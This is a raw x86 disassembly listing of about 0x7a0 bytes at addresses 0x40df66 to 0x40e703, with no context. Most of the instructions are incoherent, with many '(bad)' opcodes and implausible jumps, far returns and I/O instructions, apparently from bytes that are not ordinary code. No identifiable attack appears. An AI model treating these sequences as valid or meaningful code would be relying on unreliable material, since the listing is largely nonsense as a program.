  40df66:	xlat   BYTE PTR ds:[ebx]
  40df67:	sbb    BYTE PTR [ecx-0x4f8f4d79],0x91
  40df6e:	imul   ecx,DWORD PTR [esi+0x1f],0x3d
  40df72:	lock xor ah,BYTE PTR [eax+ebp*2]
  40df76:	xor    bl,dh
  40df78:	and    cl,BYTE PTR [edx-0x20ac3ff8]
  40df7e:	jl     0x40dfb5
  40df80:	cmp    bl,BYTE PTR [esi+0x1a]
  40df83:	xchg   edx,eax
  40df84:	push   es
  40df85:	test   bl,ch
  40df87:	pop    esi
  40df88:	inc    ebx
  40df89:	dec    ebx
  40df8a:	sbb    bl,BYTE PTR [ebx-0x6f]
  40df8d:	xor    eax,0xbd58157e
  40df92:	or     al,0xd6
  40df94:	jb     0x40df82
  40df96:	fadd   DWORD PTR [ebp-0x5e]
  40df99:	mov    ecx,0x948c23ff
  40df9e:	sar    BYTE PTR gs:[edx-0x4e],1
  40dfa2:	es inc esi
  40dfa4:	lea    ebp,[esi-0x1d673b12]
  40dfaa:	inc    ebp
  40dfab:	jb     0x40dfc7
  40dfad:	push   esi
  40dfae:	dec    edi
  40dfaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfb0:	push   ds
  40dfb1:	aaa    
  40dfb2:	fnstenv [ecx]
  40dfb4:	in     al,dx
  40dfb5:	jns    0x40df95
  40dfb7:	pop    ebp
  40dfb8:	add    eax,DWORD PTR [ebx-0x79]
  40dfbb:	retf   
  40dfbc:	sub    ebx,ecx
  40dfbe:	xchg   ebx,ecx
  40dfc0:	dec    ecx
  40dfc1:	mov    eax,DWORD PTR [ebp-0x1c]
  40dfc4:	imul   eax,ecx
  40dfc7:	add    esp,eax
  40dfc9:	xchg   edx,eax
  40dfca:	push   eax
  40dfcb:	xor    ebx,ebx
  40dfcd:	mov    edx,esp
  40dfcf:	dec    edx
  40dfd0:	inc    ebx
  40dfd1:	add    ebx,DWORD PTR [edx+ebx*1]
  40dfd4:	dec    ebx
  40dfd5:	xor    edx,edx
  40dfd7:	add    DWORD PTR [ebp-0xc],ebx
  40dfda:	pop    ebx
  40dfdb:	mov    eax,DWORD PTR [ebp-0xc]
  40dfde:	pop    edi
  40dfdf:	pop    esi
  40dfe0:	pop    ebx
  40dfe1:	leave  
  40dfe2:	ret    0x10
  40dfe5:	dec    ebp
  40dfe6:	push   ebp
  40dfe7:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40dfed:	mov    esp,ebp
  40dfef:	or     ah,dh
  40dff1:	dec    ebp
  40dff2:	add    bh,al
  40dff4:	add    BYTE PTR [eax],cl
  40dff6:	add    BYTE PTR [eax],al
  40dff8:	mov    DWORD PTR [eax],0x40f44545
  40dffe:	xor    DWORD PTR [eax],eax
  40e000:	test   DWORD PTR [ebx-0x34070b64],ecx
  40e006:	(bad)  
  40e007:	enter  0x4d45,0xbc
  40e00b:	mov    esi,DWORD PTR [edx]
  40e00d:	hlt    
  40e00e:	test   ebx,ecx
  40e010:	pushf  
  40e011:	enter  0x4df8,0x8b
  40e015:	mov    DWORD PTR [ebp-0x20],0x890208
  40e01c:	inc    ebp
  40e01d:	inc    ebp
  40e01e:	cld    
  40e01f:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e025:	or     BYTE PTR [ebx+0x0],dl
  40e028:	mov    ebx,0x8bd5400
  40e02d:	call   DWORD PTR [ecx-0x1]
  40e030:	pop    es
  40e031:	mov    ch,0x33
  40e033:	dec    ebx
  40e035:	(bad)  
  40e036:	mov    eax,0x72009ba4
  40e03b:	push   DWORD PTR [edx]
  40e03d:	or     BYTE PTR [eax],al
  40e03f:	jmp    0xff89:0x75c84d03
  40e046:	dec    ebp
  40e047:	loopne 0x40e019
  40e049:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e04f:	add    BYTE PTR [ebx],dh
  40e051:	mov    ecx,ebx
  40e053:	hlt    
  40e054:	add    ecx,ebx
  40e056:	enter  0x899b,0x32
  40e05a:	dec    ebp
  40e05b:	add    ecx,eax
  40e05d:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e063:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e06a:	xor    ecx,ebx
  40e06c:	retf   
  40e06d:	enter  0x4d03,0xc8
  40e071:	mov    DWORD PTR fs:[eax],ebx
  40e074:	lea    eax,[eax]
  40e076:	push   esp
  40e077:	mov    edi,edi
  40e079:	fs (bad) 
  40e07b:	(bad)  
  40e07c:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e082:	push   0xffffffff
  40e084:	and    bh,bh
  40e086:	pop    ecx
  40e087:	inc    eax
  40e088:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e08e:	push   0xffffff8b
  40e090:	pop    ecx
  40e091:	cld    
  40e092:	dec    ebp
  40e093:	lea    ecx,[ecx+0x45ff08ff]
  40e099:	mov    BYTE PTR [edx+0x1],cl
  40e09c:	add    BYTE PTR [eax],al
  40e09e:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e0a5:	dec    DWORD PTR [ebp-0x77]
  40e0a8:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e0af:	cld    
  40e0b0:	dec    ebp
  40e0b1:	jne    0x40e0e6
  40e0b3:	lea    eax,[ebx]
  40e0b5:	push   eax
  40e0b6:	mov    edi,edi
  40e0b8:	or     BYTE PTR [ecx+0x54a845],cl
  40e0be:	add    al,ch
  40e0c0:	(bad)  
  40e0c1:	sub    esp,ebp
  40e0c3:	add    BYTE PTR [eax],al
  40e0c5:	rol    BYTE PTR [eax],0x84
  40e0c8:	inc    ebp
  40e0c9:	add    dh,BYTE PTR [esi+0x0]
  40e0cc:	add    BYTE PTR [ebp-0x73],al
  40e0cf:	mov    ebp,DWORD PTR [esp+edx*4]
  40e0d2:	inc    DWORD PTR [eax]
  40e0d4:	lea    ecx,[ebx-0x30074f4]
  40e0da:	call   0x41ec5f
  40e0df:	add    BYTE PTR [ebp+0x0],cl
  40e0e2:	jne    0x40e125
  40e0e4:	dec    DWORD PTR [ebx-0x76210314]
  40e0ea:	dec    ebp
  40e0eb:	add    DWORD PTR [ebp+0x0],esi
  40e0ee:	(bad)  
  40e0ef:	xchg   ebp,eax
  40e0f0:	loopne 0x40e0f1
  40e0f2:	inc    eax
  40e0f3:	inc    DWORD PTR [eax]
  40e0f5:	mov    ecx,DWORD PTR [ebp-0x4]
  40e0f8:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e0fe:	add    BYTE PTR [edx],dl
  40e100:	enter  0x4d90,0x0
  40e104:	mov    eax,DWORD PTR [eax]
  40e106:	hlt    
  40e107:	add    al,0xa5
  40e109:	mov    al,0xff
  40e10b:	add    bh,bh
  40e10d:	add    BYTE PTR [ebx],dh
  40e10f:	inc    DWORD PTR [ebx]
  40e111:	sbb    al,0x89
  40e113:	jne    0x40e0ed
  40e115:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e11b:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e121:	mov    DWORD PTR [eax-0x70],0xec58ed89
  40e128:	inc    DWORD PTR [ebp-0x75]
  40e12b:	fisttp QWORD PTR [esi+ebp*8]
  40e12e:	test   DWORD PTR [esi-0x1],esp
  40e131:	inc    ebp
  40e132:	(bad)  
  40e133:	aas    
  40e134:	inc    ebp
  40e135:	(bad)  
  40e136:	lea    edi,[esp+eiz*2-0x1]
  40e13a:	inc    edi
  40e13c:	mov    DWORD PTR ds:0x8000c7a0,edi
  40e142:	mov    ebp,esp
  40e144:	cld    
  40e145:	loop   0x40e0d4
  40e147:	inc    ebp
  40e148:	(bad)  
  40e149:	out    dx,al
  40e14a:	(bad)  
  40e14b:	fisttp WORD PTR [eax+0x8801c7]
  40e151:	jecxz  0x40e198
  40e153:	in     al,dx
  40e154:	inc    DWORD PTR [ebp-0x4]
  40e157:	out    0x8d,eax
  40e159:	aas    
  40e15a:	inc    edi
  40e15c:	jmp    FWORD PTR [eax-0x78]
  40e15f:	inc    DWORD PTR [ecx]
  40e161:	mov    DWORD PTR [eax],0xc7a83d
  40e167:	ins    BYTE PTR es:[edi],dx
  40e168:	test   edi,edi
  40e16a:	pandn  mm0,mm5
  40e16d:	aas    
  40e16e:	add    bh,al
  40e170:	mov    esi,DWORD PTR [eax-0x4]
  40e173:	inc    DWORD PTR [eax+0xdf01ee]
  40e179:	(bad)  
  40e17a:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e17e:	mov    ebp,ebx
  40e180:	xchg   esp,eax
  40e181:	fild   DWORD PTR [eax]
  40e183:	(bad)  
  40e184:	mov    edi,DWORD PTR [eax+0x3]
  40e187:	(bad)  
  40e188:	cmp    al,0xe7
  40e18a:	dec    ebp
  40e18b:	leave  
  40e18c:	mov    ebp,eax
  40e18e:	fsubr  DWORD PTR [ecx]
  40e190:	add    BYTE PTR [eax],al
  40e192:	lea    ecx,[ebx-0x7f0003b4]
  40e198:	push   edx
  40e199:	add    DWORD PTR [ebp+0x0],edx
  40e19c:	mov    esi,DWORD PTR [eax]
  40e19e:	mov    WORD PTR [ebx-0x7a750000],?
  40e1a4:	add    esi,DWORD PTR [ebp-0x78]
  40e1a7:	mov    eax,DWORD PTR [eax]
  40e1a9:	cld    
  40e1aa:	push   0x7d
  40e1ac:	dec    DWORD PTR [ebx+0xd88c]
  40e1b2:	push   edx
  40e1b3:	mov    edx,DWORD PTR [ecx-0x4]
  40e1b6:	call   DWORD PTR [eax+0x7d01fc]
  40e1bc:	mov    ebx,edx
  40e1be:	cld    
  40e1bf:	add    BYTE PTR [eax+0x560150],dl
  40e1c5:	test   DWORD PTR [ebp+0x75],eax
  40e1c8:	loop   0x40e155
  40e1ca:	jmp    0xe38b:0x947dc7fc
  40e1d1:	fsub   st,st(7)
  40e1d3:	add    bh,al
  40e1d5:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e1db:	add    edi,edi
  40e1dd:	add    bh,bh
  40e1df:	mov    eax,0x50e600ed
  40e1e4:	inc    ebp
  40e1e5:	push   esi
  40e1e6:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e1ec:	test   BYTE PTR [ebx],dh
  40e1ee:	out    0x5,al
  40e1f0:	shl    BYTE PTR [edx+0x45],0x0
  40e1f4:	jmp    0x40e1b7
  40e1f6:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  40e1fd:	inc    esi
  40e1fe:	jle    0x40e200
  40e200:	test   edi,eax
  40e202:	jmp    esp
  40e204:	inc    DWORD PTR [eax]
  40e206:	in     eax,dx
  40e207:	add    dh,ah
  40e209:	jne    0x40e190
  40e20b:	mov    edi,edi
  40e20d:	cld    
  40e20e:	inc    DWORD PTR [ebp-0x14]
  40e211:	mov    esp,edx
  40e213:	mov    ah,0x85
  40e215:	add    bh,bh
  40e217:	call   0x1270b1b
  40e21c:	ror    BYTE PTR [ebx-0x7f00037b],0xff
  40e223:	add    ebx,esp
  40e225:	add    ah,ch
  40e227:	xor    BYTE PTR [ebp-0xff00cf],al
  40e22d:	mov    ebx,ebp
  40e22f:	cld    
  40e230:	jle    0x40e1bb
  40e232:	or     DWORD PTR [ecx],eax
  40e234:	add    BYTE PTR [eax],al
  40e236:	push   eax
  40e237:	add    DWORD PTR [ebp+0x45],eax
  40e23a:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e240:	dec    DWORD PTR [ebx-0x3fda0318]
  40e246:	add    BYTE PTR [ebp-0xbf0040],dl
  40e24c:	inc    ebp
  40e24d:	or     BYTE PTR [ebx-0x4faf0400],0x45
  40e254:	add    DWORD PTR [ebx+0x459c00],ecx
  40e25a:	mov    edi,edi
  40e25c:	mov    eax,0xe80800ff
  40e261:	inc    ebp
  40e262:	sub    BYTE PTR [ebx-0x47000400],cl
  40e268:	add    al,0x1
  40e26a:	rol    BYTE PTR [eax],0x1e
  40e26d:	jne    0x40e2b4
  40e26f:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e275:	inc    DWORD PTR [ecx]
  40e277:	call   0x860a7c
  40e27c:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e282:	call   0x410a88
  40e287:	xor    bh,bh
  40e289:	push   edi
  40e28a:	adc    BYTE PTR [ebx-0x747423bb],al
  40e290:	loopne 0x40e26e
  40e292:	ret    
  40e293:	loopne 0x40e230
  40e295:	xor    DWORD PTR [edx],0x31
  40e298:	cmp    edi,edi
  40e29a:	bswap  esp
  40e29c:	rol    BYTE PTR gs:[eax],0x5
  40e2a0:	jmp    0x12be3ea
  40e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  40e2a8:	add    BYTE PTR [eax+0xff0100],bh
  40e2ae:	cld    
  40e2af:	jne    0x40e32e
  40e2b1:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e2b7:	push   ss
  40e2b8:	add    DWORD PTR [eax],eax
  40e2ba:	add    BYTE PTR [eax+0x7f],dl
  40e2bd:	inc    ebp
  40e2be:	add    BYTE PTR [ebx+0x459850],cl
  40e2c4:	mov    edi,edi
  40e2c6:	test   al,0xff
  40e2c8:	add    BYTE PTR [eax],cl
  40e2ca:	inc    DWORD PTR [ebp-0x18]
  40e2cd:	jmp    DWORD PTR ds:0x4d7d00dc
  40e2d3:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e2d9:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e2df:	fwait
  40e2e0:	mov    eax,0x30132
  40e2e5:	lea    esi,[ebp+0x2c]
  40e2e8:	xor    edi,edi
  40e2ea:	(bad)  
  40e2eb:	call   0x1400a58
  40e2f0:	call   0x1350b80
  40e2f5:	jne    0x40e282
  40e2f7:	xor    edi,esp
  40e2f9:	add    eax,DWORD PTR [eax+0xc018d]
  40e2ff:	push   DWORD PTR [eax]
  40e301:	call   0xca0a5d
  40e306:	int3   
  40e307:	inc    DWORD PTR [ebp-0x14]
  40e30a:	mov    ecx,DWORD PTR [ebp-0x28]
  40e30d:	xor    eax,DWORD PTR [eax]
  40e30f:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e315:	(bad)  
  40e316:	xchg   ebp,eax
  40e317:	in     al,0xff
  40e319:	add    bh,bh
  40e31b:	add    BYTE PTR [ebp+0x45],dl
  40e31e:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  40e324:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff65]
  40e32b:	mov    edi,edi
  40e32d:	or     BYTE PTR [eax],cl
  40e32f:	inc    ebp
  40e330:	test   DWORD PTR gs:[eax],eax
  40e333:	je     0x40e37a
  40e335:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e33b:	xor    edx,DWORD PTR [eax-0x73]
  40e33e:	push   ebp
  40e33f:	or     BYTE PTR [ebp+0x21007572],al
  40e345:	inc    ebp
  40e346:	in     al,dx
  40e347:	mov    ebp,DWORD PTR [eax]
  40e349:	mov    esp,0x658bc345
  40e34e:	fmul   st,st(5)
  40e350:	add    BYTE PTR [ebx],ch
  40e352:	mov    eax,DWORD PTR [ebx]
  40e354:	cld    
  40e355:	loopne 0x40e317
  40e357:	inc    ebp
  40e358:	push   ebp
  40e359:	cmp    ebp,eax
  40e35b:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e362:	cld    
  40e363:	fadd   DWORD PTR [eax+0x3b014d]
  40e369:	jne    0x40e39b
  40e36b:	push   0xf8898557
  40e370:	in     al,dx
  40e371:	jne    0x40e3b8
  40e373:	lea    eax,[ebx+0x72e8dcc8]
  40e379:	das    
  40e37a:	mov    eax,DWORD PTR [eax]
  40e37c:	mov    esp,0x33eb7545
  40e381:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e387:	xor    eax,edi
  40e389:	adc    DWORD PTR [ebp-0xcd0065],0x8be131
  40e393:	rcl    BYTE PTR [eax-0x40],1
  40e396:	inc    ebp
  40e397:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e39f:	inc    ebp
  40e3a0:	xchg   ebp,eax
  40e3a1:	ud0    ebp,DWORD PTR [ebx]
  40e3a4:	inc    DWORD PTR [eax]
  40e3a6:	retf   
  40e3a7:	jbe    0x40e3a9
  40e3a9:	mov    dl,BYTE PTR [eax-0x80]
  40e3ac:	push   ebp
  40e3ad:	pop    ds
  40e3ae:	mov    ecx,DWORD PTR [esp+esi*8]
  40e3b1:	inc    eax
  40e3b2:	retf   
  40e3b3:	inc    ebp
  40e3b4:	iret   
  40e3b5:	jb     0x40e37f
  40e3b7:	mov    eax,DWORD PTR [edi]
  40e3b9:	enter  0x4545,0x1
  40e3bd:	xor    DWORD PTR [eax],eax
  40e3bf:	pushf  
  40e3c0:	mov    ecx,DWORD PTR [ecx+0x324df0bc]
  40e3c6:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  40e3cd:	dec    ebp
  40e3ce:	add    BYTE PTR [ebx],dh
  40e3d0:	inc    ebp
  40e3d1:	mov    DWORD PTR [ebx-0x3f641b4c],ecx
  40e3d7:	xor    dl,BYTE PTR [edx]
  40e3d9:	add    eax,DWORD PTR [ebp-0x77]
  40e3dc:	mov    eax,esp
  40e3de:	fmul   DWORD PTR [ebp-0x3d]
  40e3e1:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  40e3e8:	mov    DWORD PTR [ebp-0x28],eax
  40e3eb:	rol    DWORD PTR [ebp-0x64],1
  40e3ee:	xor    eax,edi
  40e3f0:	mov    ecx,0xff858db0
  40e3f5:	clc    
  40e3f6:	enter  0x4d45,0x3c
  40e3fa:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e401:	test   esi,edi
  40e403:	clc    
  40e404:	inc    DWORD PTR [ebp+0x45]
  40e407:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e40f:	test   DWORD PTR [ecx],esi
  40e411:	clc    
  40e412:	pushf  
  40e413:	inc    ebp
  40e414:	(bad)  
  40e415:	cmp    ah,bh
  40e417:	pushf  
  40e418:	inc    ebp
  40e419:	mov    edx,DWORD PTR [eax-0x28]
  40e41c:	lock push ebp
  40e41e:	add    BYTE PTR [ebx],dh
  40e420:	mov    DWORD PTR [ebx],eax
  40e422:	sar    BYTE PTR [ebx],1
  40e424:	adc    BYTE PTR [edi],cl
  40e426:	dec    ebp
  40e427:	adc    al,0x8b
  40e429:	add    al,dl
  40e42b:	jmp    0x101e5fb
  40e430:	jb     0x40e47f
  40e432:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e438:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e43b:	xor    ecx,DWORD PTR [edi]
  40e43d:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e441:	(bad)  
  40e443:	clc    
  40e444:	enter  0x8400,0x8b
  40e448:	pop    es
  40e449:	mov    al,0x0
  40e44b:	push   ebp
  40e44c:	push   cs
  40e44d:	xor    ecx,eax
  40e44f:	xor    esp,ecx
  40e451:	add    ebp,DWORD PTR [eax]
  40e453:	add    esi,DWORD PTR [eax]
  40e455:	(bad)  
  40e457:	retf   0x55c8
  40e45a:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e45e:	(bad)  
  40e45f:	cli    
  40e460:	fdivr  st,st(1)
  40e462:	test   DWORD PTR [eax+edi*8],ecx
  40e465:	dec    ebp
  40e466:	inc    ebp
  40e467:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e46d:	add    BYTE PTR [ebp+0x0],al
  40e470:	mov    ecx,DWORD PTR [ebp-0x28]
  40e473:	mov    ecx,ebx
  40e475:	clc    
  40e476:	jne    0x40e443
  40e478:	mov    esi,0xd672d3
  40e47d:	into   
  40e47e:	into   
  40e47f:	scas   eax,DWORD PTR es:[edi]
  40e480:	dec    ebp
  40e481:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e487:	sub    ecx,esi
  40e489:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e48c:	(bad)  
  40e48d:	mov    edi,eax
  40e48f:	mov    al,0x85
  40e491:	mov    eax,edi
  40e493:	add    BYTE PTR [ebp-0x75],al
  40e496:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e49d:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e4a3:	(bad)  
  40e4a5:	retf   0x559c
  40e4a8:	(bad)  
  40e4a9:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e4b0:	inc    ebp
  40e4b1:	add    eax,0xeb9c4d3f
  40e4b6:	(bad)  
  40e4b7:	mov    ecx,esp
  40e4b9:	lods   al,BYTE PTR ds:[esi]
  40e4ba:	test   DWORD PTR [ebp-0x8],edx
  40e4bd:	xor    ecx,DWORD PTR [ebp+0x33]
  40e4c0:	mov    eax,DWORD PTR [ebx]
  40e4c2:	lock add ecx,ebx
  40e4c5:	bswap  esi
  40e4c7:	retf   0x55d1
  40e4ca:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e4d0:	jmp    0x40e4cb
  40e4d2:	add    BYTE PTR ds:0xebc44d8b,al
  40e4d8:	push   ebp
  40e4d9:	mov    ebp,DWORD PTR [ebx]
  40e4db:	test   al,0x8b
  40e4dd:	push   ebp
  40e4de:	clc    
  40e4df:	xor    ecx,ebx
  40e4e1:	xor    ecx,esi
  40e4e3:	add    edx,ecx
  40e4e5:	add    eax,DWORD PTR [edx+0xca010f]
  40e4eb:	push   ebp
  40e4ec:	dec    ebp
  40e4ed:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e4f3:	stc    
  40e4f4:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e4fa:	scas   eax,DWORD PTR es:[edi]
  40e4fb:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e501:	xor    ebp,DWORD PTR [ebx]
  40e503:	xor    edi,DWORD PTR [ebx]
  40e505:	add    esi,DWORD PTR [edi+0x3]
  40e508:	mov    ecx,DWORD PTR [edi]
  40e50a:	clc    
  40e50b:	retf   0x55cb
  40e50e:	into   
  40e50f:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e516:	mov    eax,0x3376554d
  40e51b:	mov    esi,DWORD PTR [ebx]
  40e51d:	int3   
  40e51e:	add    edx,DWORD PTR [ebp+0x3]
  40e521:	xor    ecx,DWORD PTR [edi]
  40e523:	xor    ecx,edx
  40e525:	add    edx,DWORD PTR [ebp+0x3]
  40e528:	mov    ecx,DWORD PTR [edi]
  40e52a:	lock retf 0x4dfa
  40e52e:	stc    
  40e52f:	mov    ecx,DWORD PTR [eax]
  40e531:	or     BYTE PTR [ebp+0x4d],cl
  40e534:	jmp    0x104e5c4
  40e539:	dec    ebp
  40e53a:	dec    ebp
  40e53b:	(bad)  
  40e53c:	mov    ebx,esp
  40e53e:	clc    
  40e53f:	test   ebx,ecx
  40e541:	clc    
  40e542:	ror    DWORD PTR [ebp-0x2a],cl
  40e545:	mov    esi,ecx
  40e547:	call   0x33cc2afb
  40e54c:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e553:	retf   
  40e554:	ja     0x40e524
  40e556:	mov    ebp,DWORD PTR [eax-0x48]
  40e559:	dec    ebp
  40e55a:	xor    ecx,DWORD PTR [di+0x3]
  40e55e:	mov    esp,esp
  40e560:	clc    
  40e561:	push   ebp
  40e562:	retf   
  40e563:	mov    dl,bl
  40e565:	adc    esi,edx
  40e567:	jb     0x40e537
  40e569:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e56f:	call   0x4d6cb0f1
  40e574:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e57a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e57b:	fwait
  40e57c:	inc    ebp
  40e57d:	xor    cl,BYTE PTR [ebp-0x78]
  40e580:	mov    edx,edi
  40e582:	clc    
  40e583:	dec    ebp
  40e584:	retf   
  40e585:	mov    edx,ebx
  40e587:	call   0x560fb962
  40e58c:	scas   eax,DWORD PTR es:[edi]
  40e58d:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e593:	fwait
  40e594:	sub    esi,DWORD PTR [edx]
  40e596:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e59c:	lods   al,BYTE PTR ds:[esi]
  40e59d:	xor    esp,DWORD PTR [ebx]
  40e59f:	add    ecx,DWORD PTR [ebp-0x1c]
  40e5a2:	mov    edi,DWORD PTR [ebp-0x8]
  40e5a5:	mov    bl,cl
  40e5a7:	cmp    dl,bl
  40e5a9:	jb     0x40e579
  40e5ab:	add    dh,dl
  40e5ad:	dec    ebp
  40e5ae:	scas   eax,DWORD PTR es:[edi]
  40e5af:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e5b5:	shr    DWORD PTR [ebx],cl
  40e5b7:	into   
  40e5b8:	cmp    edx,esi
  40e5ba:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e5c0:	dec    ebp
  40e5c1:	dec    ebp
  40e5c2:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e5c8:	retf   
  40e5c9:	xor    edx,esi
  40e5cb:	add    ecx,esi
  40e5cd:	imul   ecx,edx
  40e5d0:	mov    DWORD PTR [ebp+0x8],edx
  40e5d3:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e5d6:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e5dc:	add    esi,DWORD PTR [ebx]
  40e5de:	mov    ah,0x3
  40e5e0:	inc    ebp
  40e5e1:	rdtsc  
  40e5e3:	xlat   BYTE PTR ds:[ebx]
  40e5e4:	pushf  
  40e5e5:	jge    0x40e570
  40e5e7:	xor    ebx,eax
  40e5e9:	sub    eax,DWORD PTR [ebp-0x73]
  40e5ec:	(bad)  
  40e5ed:	cmp    al,al
  40e5ef:	jb     0x40e576
  40e5f1:	add    al,bh
  40e5f3:	ror    DWORD PTR [ebp-0x7a],1
  40e5f6:	xor    edi,edi
  40e5f8:	add    edi,edi
  40e5fa:	jmp    0x40e649
  40e5fc:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e602:	dec    ebp
  40e603:	into   
  40e604:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e60a:	fwait
  40e60b:	shl    DWORD PTR [edx],cl
  40e60d:	retf   0x5588
  40e610:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e616:	add    eax,DWORD PTR [eax]
  40e618:	in     al,0x4d
  40e61a:	push   ebp
  40e61b:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e621:	gs add ch,cl
  40e624:	dec    ebp
  40e625:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e62b:	dec    ebp
  40e62c:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e632:	jge    0x40e602
  40e634:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e63a:	add    cl,dh
  40e63c:	dec    ebp
  40e63d:	dec    DWORD PTR [ebx-0x2c032375]
  40e643:	adc    BYTE PTR [ebp+0x1],0x8b
  40e647:	add    al,bl
  40e649:	jge    0x40e5d7
  40e64b:	push   0xffffff9b
  40e64d:	push   0x8b3032
  40e652:	shl    BYTE PTR [ebp+0x55],0x6a
  40e656:	xor    edi,edi
  40e658:	xor    edx,DWORD PTR [ebx+eax*1]
  40e65b:	inc    ebp
  40e65c:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e662:	dec    ebp
  40e663:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e669:	jbe    0x40e5f6
  40e66b:	mov    ebp,esp
  40e66d:	ror    bl,1
  40e66f:	enter  0x14ce,0xaf
  40e673:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e679:	push   ebp
  40e67a:	retf   0x5540
  40e67d:	push   ebp
  40e67e:	mov    esi,DWORD PTR [edx-0x1c]
  40e681:	mov    edx,ebx
  40e683:	cld    
  40e684:	(bad)  
  40e685:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e68c:	sti    
  40e68d:	add    dh,cl
  40e68f:	push   0xffffff94
  40e691:	call   FWORD PTR [ebx+0x3b5032d0]
  40e697:	mov    ecx,DWORD PTR [edi]
  40e699:	int3   
  40e69a:	pop    esi
  40e69b:	inc    ebp
  40e69c:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e6a2:	push   ebp
  40e6a3:	xor    esi,DWORD PTR [ebx]
  40e6a5:	mov    DWORD PTR [ebx],0xcace0f9c
  40e6ab:	aas    
  40e6ac:	push   ebp
  40e6ad:	inc    ebp
  40e6ae:	xor    edx,esi
  40e6b0:	add    edx,esi
  40e6b2:	mov    eax,DWORD PTR [ebx]
  40e6b4:	(bad)  
  40e6b5:	jmp    0x40e643
  40e6b7:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  40e6bd:	rol    ah,1
  40e6bf:	mov    esi,0xf133104d
  40e6c4:	mov    edx,0xff388d80
  40e6c9:	mov    dh,0xd1
  40e6cb:	cmp    edx,DWORD PTR [ebp+0xf]
  40e6ce:	mov    eax,DWORD PTR [edx-0x20]
  40e6d1:	add    BYTE PTR [ebp-0x75],bh
  40e6d4:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e6db:	fwait
  40e6dc:	retf   0x8632
  40e6df:	cmp    ebp,0x8
  40e6e2:	call   ebx
  40e6e4:	inc    ebp
  40e6e5:	inc    ebp
  40e6e6:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e6ec:	mov    esi,DWORD PTR [ecx]
  40e6ee:	enter  0x49c,0xc7
  40e6f2:	add    al,al
  40e6f4:	add    bl,al
  40e6f6:	(bad)  
  40e6f7:	clc    
  40e6f8:	enter  0x45,0x31
  40e6fc:	push   eax
  40e6fd:	pushf  
  40e6fe:	mov    edi,eax
  40e700:	int3   
  40e701:	or     al,al
  40e703:	test   DWORD PTR [edi],edi
